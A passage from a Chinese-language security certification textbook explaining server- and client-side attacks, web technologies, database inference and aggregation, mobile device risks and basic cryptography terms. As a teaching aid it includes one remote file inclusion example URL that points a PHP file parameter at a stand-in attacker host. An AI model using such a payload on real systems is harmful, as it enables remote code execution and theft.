打补丁、系统加固、防火墙及其他纵深防御形式可缓解服务端攻击。除非系统经过加固并部署在 DMZ 网络中（我们将在 Chapter 5，Domain 4: Communication and Network Security 中讨论），否则组织不应允许来自互联网等不可信网络的直接访问服务器端口。

> **Note**
>
> 服务端攻击利用已安装服务中的漏洞。这不仅仅是“服务器”问题（如运行 `Windows Server 2022` 的文件服务器）：运行 `Ubuntu Linux 22.04` 和 `Windows 11` 等操作系统的台式机和笔记本电脑也运行服务，可能容易受到服务端攻击。有些人倾向于使用“service-side attack”以明确这一区别，但考试使用术语“server-side”。

##### Client-Side Attacks（客户端攻击）

*Client-side attacks* 发生在用户下载恶意内容时。与服务端攻击相比，数据流向相反：客户端攻击由受害者发起，从攻击者处下载内容，如 Fig. 4.21 所示。

Fig. 4.21 Client-side attack.

对于允许互联网访问的组织，客户端攻击难以缓解。客户端包括文字处理软件、电子表格、媒体播放器和 Web 浏览器。`Chrome` 和 `Firefox` 等浏览器实际上是软件集合：浏览器本身，加上 `Adobe Acrobat Reader`、`iTunes`、`QuickTime` 等第三方软件。所有这些都可能容易受到客户端攻击。所有客户端软件都必须打补丁，这是许多组织面临的挑战。

大多数防火墙的入站限制远比出站严格：它们设计用于“拦截坏人”，缓解源自不可信网络的服务端攻击。它们往往无法防止客户端攻击。

##### Web Architecture and Attacks（Web 架构与攻击）

15 年前的 World Wide Web 更简单：大多数网页是静态的，用 HTML 渲染。“Web 2.0”的出现带来了动态内容、多媒体和用户创建的数据，增加了 Web 的攻击面：创造了更多攻击向量。`PHP`（一个“递归首字母缩写”，代表 `PHP: Hypertext Preprocessor`）等动态 Web 语言使网页功能更强大、更动态，但也更容易受到安全攻击。

一个 `PHP` 攻击示例是“远程文件包含”攻击。URL（统一资源定位符）如 `https://good.example.com/index.php?file=readme.txt` 引用一个名为 `index.php` 的 `PHP` 脚本。该脚本动态加载“?”后引用的文件 `readme.txt`，并在浏览器中显示。

攻击者在 Web 服务器 `evil.example.com` 上托管一个名为 `evil.php` 的恶意 `PHP` 文件，然后操纵 URL，输入：

`https://good.example.com/index.php?file=https://evil.example.com/evil.php`

如果 `good.example.com` 配置不当，它将下载 `evil.php` 并在本地执行，允许攻击者窃取信息、创建后门并执行其他恶意任务。

###### Applets

###### 小程序

**小程序** 是嵌入在其他软件（如 Web 浏览器）中的小段移动代码。与提供内容显示方式的 HTML（超文本标记语言）不同，小程序是可执行文件。主要的安全顾虑在于小程序从服务器下载后在本地运行。恶意小程序可能会危及客户端的安全。

小程序可以用多种编程语言编写；两种主要的小程序语言是 **Java**（由 Oracle/Sun Microsystems 开发）和 **ActiveX**（由 Microsoft 开发）。"Applet" 一词用于 `Java`，而 "control" 用于 `ActiveX`，尽管它们在功能上相似。

###### Java

`Java` 是一种面向对象的语言，不仅用于编写小程序，还作为一种通用编程语言。`Java` 字节码与平台无关：它由 `Java` 虚拟机（`JVM`）解释执行。`JVM` 可用于多种操作系统，包括 `Linux`、`FreeBSD` 和 `Microsoft Windows`。

`Java` 小程序在沙箱中运行，将代码与操作系统隔离开。沙箱旨在防止攻击者在攻破 `Java` 小程序后访问系统文件（如密码文件）。在沙箱中运行的代码必须是自给自足的：它不能依赖沙箱外部存在的操作系统文件。受信任的 Shell 是静态编译的 Shell（不使用操作系统共享库），可用于沙箱中。

###### ActiveX

`ActiveX` 控件是 `Java` 小程序的功能等价物。它们使用数字证书而非沙箱来提供安全性。`ActiveX` 控件与操作系统的联系更紧密，允许通过 `Windows Update` 安装补丁等功能。与 `Java` 不同，`ActiveX` 是 `Microsoft` 技术，仅适用于 `Microsoft Windows` 操作系统。

###### OWASP

开放 Web 应用程序安全项目（`OWASP`，参见 [`www.owasp.org`](https://www.owasp.org)）是最好的应用安全资源之一。`OWASP` 提供了大量免费资源，致力于改善组织的应用安全状况。他们最著名的项目之一是 OWASP Top 10 项目，该项目就什么是 10 个最重要的应用安全风险提供了共识指导。OWASP Top 10 可在 [`owasp.org/www-project-top-ten/`](https://owasp.org/www-project-top-ten/) 获取。

除了关于应用安全威胁、漏洞和防御的丰富信息外，`OWASP` 还维护着几款可免费下载的安全工具，包括一款领先的拦截代理：`ZAP`，即 Zed Attack Proxy。

###### XML

**XML**（可扩展标记语言）是一种标记语言，旨在作为编码文档和数据的标准方式。`XML` 类似于 `HTML`，但更通用。`XML` 用于 Web，但不局限于 Web：`XML` 可用于存储应用程序配置和审计工具的输出，还有许多其他用途。可扩展意味着用户可以使用 `XML` 定义自己的数据格式。

###### 面向服务的架构 (SOA)

面向服务的架构（`SOA`）试图将应用程序架构简化为服务的功能单元。`SOA` 旨在允许多个异构应用程序成为服务的消费者。服务可在整个组织中使用和重用，而非在每个需要该服务提供的功能的单个应用程序中单独构建。

服务预期应与平台无关，并能以不依赖特定编程语言的通用方式被调用。其意图是任何应用程序只需使用其所选编程语言中可用的标准手段即可利用该服务。服务通常以某种形式的目录发布，提供有关如何使用该服务及其提供功能的详细信息。

虽然 Web 服务不是唯一的例子，但它们是 `SOA` 模型最常见的例子。`XML` 或 `JSON`（JavaScript 对象表示法）常用于 Web 服务的底层数据结构，`SOAP`（最初是 "Simple Object Access Protocol" 的首字母缩写，但现在仅称为 "SOAP"）或 `REST`（表述性状态转移）提供连接性，而 `WSDL`（Web 服务描述语言）提供有关如何调用 Web 服务的详细信息。

> **考试警告**
>
> 不要混淆面向服务的架构（`SOA`）与 `SOAP`。它们相关但不同：`SOA` 可能使用 `SOAP` 进行连接。

#### 数据库安全

数据库带来了独特的安全挑战。数据库中可能存放的海量数据需要特殊的安全考量。正如我们将在 "推理与聚合" 部分看到的那样，数据库用户通过创建、查看和比较记录建立的逻辑联系可能导致推理和聚合攻击，这需要数据库安全预防措施，如 **推理** 控制和 **多实例化**。

##### 多实例化

多实例化允许两个不同的对象拥有相同的名称。该名称基于拉丁语词根：multiple（多个，poly）和 instances（实例，instantiation）。数据库多实例化意味着两行可能具有相同的主键，但数据不同。

假设你有一个多级安全数据库表。每个元组（元组是关系数据库中的一行或一个条目）包含带有机密、秘密或绝密安全标签的数据。具有相同三种级别许可的主体可以访问该表。系统遵循强制访问控制规则，包括 "不上读"：秘密主体不能读取标记为绝密的条目。

一位具有秘密许可的经理正准备裁员，打开 "layoffs"（裁员）表，并尝试为员工 John Doe 创建一个主键为 `123-45-6789` 的条目。该秘密主体不知道已存在一个主键相同、标记为绝密的 John Doe 条目。事实上，整个部门（包括经理）都存在标记为绝密的条目：整个部门都将被裁员。此信息标记为绝密：经理无法读取。

正常数据库通常要求表中所有行包含唯一的主键，因此当经理尝试插入新条目时，普通数据库会生成类似 "duplicate entry"（重复条目）的错误。多级安全数据库不能这样做，否则会允许经理推断出绝密信息。

多实例化意味着数据库将创建两个具有相同主键的条目：一个标记为秘密，一个标记为绝密。

##### 推理与聚合

当用户能利用较低级别的访问权限获取受限信息时，就会发生推理和 **聚合**。这些问题发生在多个领域，包括数据库安全。

推理需要演绎：有一个谜题待解，较低级别的细节提供了线索。聚合是一个数学过程：用户提出所有问题，获得所有答案，并推导出受限信息。

###### 举例学习

####### 五角大楼披萨推理

######## 美国国防部五角大楼在 1991 年 1 月 16 日晚上订购了大量披萨，远超正常水平。

披萨外卖车的庞大数量让许多没有美国军方安全许可的人员注意到，有很多人在加班加点工作，因此推断即将发生大事。他们的推断是正确的；沙漠风暴行动（即第一次海湾战争）即将发动：“除了技术手段外，Ceralde 少校举了一个例子，说明看似‘无害’的信息片段如何能勾勒出全貌。他描述了 1991 年 1 月 16 日晚上，五角大楼停车场停放的车辆比平时多，披萨店发现送往五角大楼和其他政府机构的披萨订单显著增加。Ceralde 少校说，这些观察属于指标，是所有人都能获取的非密信息。沙漠风暴行动正是在那个晚上开始的” [\[30\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0150)。

推理需要演绎：线索摆在面前，使用者进行逻辑演绎。这就像侦探破案：“为什么五角大楼停车场有这么多披萨外卖车？肯定有很多人通宵达旦地工作……我想知道为什么？”在我们的数据库示例中，需要多实例化来防止经理推断出已经计划裁掉 John Doe。

聚合与推理类似，但有一个关键区别：不需要演绎。聚合提出所有问题，获取所有答案，然后使用者组装出受限信息。

想象你有一个在线电话数据库。普通用户可以将姓名（如 Jane Doe）解析为号码（如 555-1234）。他们也可以执行反向查找，将 555-1234 解析为 Jane Doe。普通用户无法下载整个数据库：只有电话管理员才能这样做。这是为了防止推销员下载整个电话数据库并向组织内所有人推销电话。

聚合允许普通用户下载整个数据库，获取通常仅限电话管理员访问的信息。当普通用户对 555-0000 执行反向查找，然后是 555-0001、555-0002 等，直到 555-9999 时，就会发起聚合攻击。用户提出每一个问题（对一个电话交换局内每个号码进行反向查找），获得每一个答案，并聚合出整个电话数据库。

##### 推理与聚合控制

数据库可能需要推理和聚合控制。基于前面“五角大楼披萨”案例的现实推理控制示例是：与供餐商签订保密协议（NDA）合同，要求其在短时间内安全、灵活地配送所需数量的食物。

数据库推理控制的一个示例是多实例化。数据库聚合控制可能包括将普通用户限制为有限数量的查询。

##### 数据挖掘

*数据挖掘* 在海量数据中搜索模式，这些模式否则会“淹没在噪音中”。信用卡发行机构已成为数据挖掘专家，他们搜索数据库中存储的数百万笔信用卡交易，以发现欺诈迹象。简单的数据挖掘规则，如“在 Y 时间内，在 Z 地点进行 X 次或更多次购买”，可用于发现被盗并被欺诈性使用的信用卡。

数据挖掘引发了隐私担忧：想象一下，如果人寿保险公司利用数据挖掘追踪香烟和酒精等购买记录，并以此为由拒绝理赔。

##### 数据分析

数据分析可通过让组织更好地了解典型用例以及什么构成了与数据库的典型或正常交互基线，从而在数据库安全中发挥作用。了解正常操作的样子，可能让组织更主动地识别来自内部威胁或被盗用账户的滥用行为。考虑到数据库中极有可能存放着重要和/或敏感数据，任何能提高组织检测滥用能力的工具都可能对安全产生重大裨益。

##### 对策

缓解前一节所述攻击的主要对策是*纵深防御*：跨越多个领域的多重重叠控制，相互增强、相互支撑。任何单一控制都可能失效；纵深防御（也称为分层防御）可缓解这一问题。

技术对策将在 第 5 章，领域 4：通信与网络安全中讨论。它们包括路由器和交换机、防火墙、系统加固（包括移除不必要的服务和打补丁）、虚拟专用网络等。

管理对策将在 第 2 章，领域 1：安全与风险管理中讨论。它们包括策略、程序、指南、标准和相关文档。

物理对策将在本章后面讨论。它们包括楼宇和办公室安全、锁具、保安、移动设备加密等。

#### 移动设备攻击

近期的一个信息安全挑战是移动设备（从 USB 闪存驱动器到笔记本电脑）在安全边界之外感染恶意软件，然后被带入组织内部。传统的基于网络的保护（如防火墙和入侵检测系统）无法阻止初始攻击。

受感染的移动计算机（如笔记本电脑）一旦插入网络，可能开始攻击其他系统。USB 闪存驱动器可通过 Microsoft Windows 的“自动运行”功能感染主机系统，即插入设备时自动执行 `autorun.inf` 文件。某些类型的恶意软件会创建或编辑 `autorun.inf`，以便在插入 USB 闪存驱动器时传播到其他系统。

##### 移动设备防御

防御措施包括管理控制，如通过策略限制移动设备的使用。美国国防部在据称爆发了通过 USB 传播的 SillyFDC 蠕虫后，制定了此类策略。[Wired.com](http://Wired.com) 报道：“国防部的技术专家们对一种在其网络中迅速蔓延的蠕虫感到恐慌。因此，他们暂停了所谓的拇指驱动器、CD、闪存卡及所有其他可移动数据存储设备在其网络上的使用，以试图阻止该蠕虫进一步扩散” [\[31\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0155)。

缓解受感染移动计算机的技术控制包括要求在 OSI 模型第 2 层通过 `802.1X` 进行认证，我们将在 第 5 章，领域 4：通信与网络安全中讨论这一点。`802.1X` 认证可捆绑额外的安全功能，如验证当前补丁和防病毒签名。实现此功能的两种技术是网络准入控制（`NAC`）和网络访问保护（`NAP`）。`NAC` 是由包括思科系统在内的厂商支持的基于网络设备的解决方案。`NAP` 是微软基于计算机操作系统的解决方案。

另一个移动设备安全问题是移动设备的丢失或被盗，这威胁到设备及其驻留数据的机密性、完整性和可用性。备份可确保移动数据的可用性和完整性。

应使用全盘加密（也称为整盘加密）来确保移动设备数据的机密性。这可以通过硬件或软件实现，且优于加密文件、目录或分区等部分加密解决方案。

远程擦除功能是另一项关键控制，指擦除（有时还可禁用）丢失或被盗移动设备的能力。

### 基石密码学概念

#### 密码学

密码学是秘密书写：一种安全通信，只有预期的接收者才能理解。虽然数据正在传输这一事实可能是已知的，但该数据的内容应对第三方保持未知。传输中的数据（在网络上移动）和静态数据（存储在磁盘等设备上）均可加密。

密码学的使用可追溯至数千年前，但它也是现代世界不可或缺的一部分。数学和计算机在现代密码学中发挥着关键作用。基本密码学概念体现在强加密中，在了解具体实现之前必须先理解这些概念。

##### 关键术语

**密码学**（Cryptology）是安全通信的科学。**加密学**（Cryptography）创建含义隐藏的消息；**密码分析**（cryptanalysis）是破解加密消息（恢复其含义）的科学。许多人用“加密学”代替“密码学”：重要的是要记住，密码学包含加密学和密码分析两者。

**密码**（cipher）是一种加密算法。**明文**（plaintext）是未加密的消息。**加密**（Encryption）将明文转换为**密文**（ciphertext）。**解密**（Decryption）将密文还原为明文。

##### 机密性、完整性、认证和不可抵赖性

密码学可提供机密性（秘密保持秘密）和完整性（数据未以未授权方式被篡改）：重要的是要注意，它不直接提供可用性。密码学还可提供认证（证明身份声明）。

此外，密码学可提供**不可抵赖性**（non-repudiation），即确保特定用户执行了特定交易且该交易未被篡改。这两者必须绑定在一起。如果汽车经销商能在你签署合同后提高价格，那么证明你签署了购车合同就毫无用处。不可抵赖性意味着执行交易（如向系统认证并查看个人身份信息 PII）的个人事后不能抵赖（或否认）曾执行过该操作。

##### 扩散、混淆、替换和置换

**扩散**（Diffusion）意味着明文的顺序应在密文中被“扩散”（或分散）。**混淆**（Confusion）意味着明文和密文之间的关系应尽可能“混淆”（或随机）。信息安全之父克劳德·香农在其论文《保密系统的通信理论》中于 1949 年首次定义了这些术语 [[32]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0160)。

加密**替换**（substitution）用一个字符替换另一个字符；这提供了混淆。**置换**（Permutation，也称为换位）通过重新排列明文字符（类似重组字母游戏）提供扩散。例如，“ATTACKATDAWN”可重新排列为“CAAKDTANTATW”。替换和置换常结合使用。虽然这些技术历史上曾被使用（如**凯撒密码**就是一种替换密码），但它们仍以组合形式用于现代密码（如**高级加密标准** AES）中。

强加密会破坏模式。如果明文的单个比特发生变化，生成的密文中每个比特发生变化的几率应为 50/50。任何非随机性的迹象都可能被密码分析师用作线索，暗示原始明文或密钥的潜在规律。

> **注意**
>
